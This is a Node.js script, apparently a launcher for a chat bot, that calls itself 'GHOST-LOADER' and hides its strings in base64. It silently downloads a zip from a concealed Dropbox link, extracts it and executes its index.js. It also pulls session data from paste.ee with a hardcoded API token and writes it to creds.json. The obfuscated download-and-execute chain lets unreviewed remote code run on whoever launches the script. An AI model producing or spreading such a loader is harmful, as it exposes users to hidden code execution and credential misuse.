import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import AdmZip from 'adm-zip';
import zlib from 'zlib';
import fetch from 'node-fetch';

const _0xDec = (_0xStr) => Buffer.from(_0xStr, 'base64').toString('utf-8');
const _0xLg = (_0xM) => console.log(_0xDec('W0dIT1NULUxPQURFUl0g') + _0xDec(_0xM));


const _0xVlt = "aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL25jOGNjZ21ya3YzM2I2NmY5aHI2OS92aHViX2NvcmUuemlwP3Jsa2V5PXZudGc3aTZxbTVyZ3g2YXM0bnloY2Nmc2Mmc3Q9cGdpc3NkcHAmZGw9MQ==";

const _0xDl = async (_0xU, _0xD) => {
    const _0xR = await fetch(_0xU, { headers: { 'User-Agent': _0xDec('TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCk=') } });
    if (!_0xR.ok) throw new Error(_0xR.statusText);
    const _0xS = fs.createWriteStream(_0xD);
    return new Promise((_0xRs, _0xRj) => { _0xR.body.pipe(_0xS); _0xR.body.on('error', _0xRj); _0xS.on('finish', () => { _0xS.close(); _0xRs(); }); });
};

const _0xFnd = (_0xDr) => {
    const _0xFls = fs.readdirSync(_0xDr);
    const _0xTgt = _0xDec('aW5kZXguanM=');
    if (_0xFls.includes(_0xTgt)) return path.join(_0xDr, _0xTgt);
    for (const _0xF of _0xFls) {
        const _0xP = path.join(_0xDr, _0xF);
        if (fs.statSync(_0xP).isDirectory()) { const _0xFd = _0xFnd(_0xP); if (_0xFd) return _0xFd; }
    }
    return null;
};


const _0xMnt = async (_0xSid, _0xFld) => {
    if (!_0xSid) return;
    let _0xRaw = "";
    const _0xT1 = _0xDec('VklOTklFfg==');
    const _0xT2 = _0xDec('VkhVQn4=');

    if (_0xSid.startsWith(_0xT1)) {
        _0xLg('8J+UkyBVbmxvY2tpbmcgTG9jYWwgU2Vzc2lvbiBTdHJpbmcuLi4=');
        _0xRaw = _0xSid.split(_0xT1)[1];
    } else if (_0xSid.startsWith(_0xT2)) {
        _0xLg('4piB77iPIEZldGNoaW5nIFJlbW90ZSBWYXVsdCBLZXkuLi4=');
        const _0xPid = _0xSid.split(_0xT2)[1];
        try {
            const _0xEp = _0xDec('aHR0cHM6Ly9hcGkucGFzdGUuZWUvdjEvcGFzdGVzLw==') + _0xPid;
            const _0xRq = await fetch(_0xEp, { headers: { 'X-Auth-Token': _0xDec('YTZaTnowZUtrUEZsYndjeVBOdm04NlhVS3dISXBiOUU5ZDJwQnNMOHc=') } });
            const _0xDt = await _0xRq.json();
            if (!_0xDt.paste) throw new Error();
            _0xRaw = _0xDt.paste.sections[0].contents;
        } catch (e) { throw new Error('VAULT_DENIED'); }
    } else return;

    const _0xBf = Buffer.from(_0xRaw, 'base64');
    const _0xCr = zlib.inflateSync(_0xBf).toString('utf-8');
    const _0xSd = path.join(_0xFld, _0xDec('c2Vzc2lvbg=='));
    if (!fs.existsSync(_0xSd)) fs.mkdirSync(_0xSd, { recursive: true });
    fs.writeFileSync(path.join(_0xSd, _0xDec('Y3JlZHMuanNvbg==')), _0xCr);
    _0xLg('4pyFIEdob3N0Q29yZSBBdXRoZW50aWNhdGVk');
};


(async () => {
    _0xLg('U1lTVEVNIEJPT1RJTkcuLi4=');
    try {
        const _0xU = _0xDec(_0xVlt);
        const _0xZp = path.join(process.cwd(), _0xDec('Y29yZS56aXA='));
        const _0xXp = path.join(process.cwd(), _0xDec('aHViX3RlbXA='));

        if (!fs.existsSync(_0xXp)) fs.mkdirSync(_0xXp, { recursive: true });
        
        _0xLg('RVhUUkFDVElORyBQQVlMT0FELi4u');
        await _0xDl(_0xU, _0xZp);
        new AdmZip(_0xZp).extractAllTo(_0xXp, true);
        fs.unlinkSync(_0xZp);
        
        const _0xEnt = _0xFnd(_0xXp);
        if (!_0xEnt) throw new Error('MISSING_CORE');

        process.chdir(path.dirname(_0xEnt));
        
        await _0xMnt(process.env.SESSION_ID, process.cwd());
        
        _0xLg('SU5JVElBVElORyBJTlRFUkZBQ0UuLi4=');
        await import(`file://${_0xEnt}`);
    } catch (e) {
        console.error(_0xDec('W0ZBVEFMXSA=') + e.message);
        process.exit(1);
    }
})();
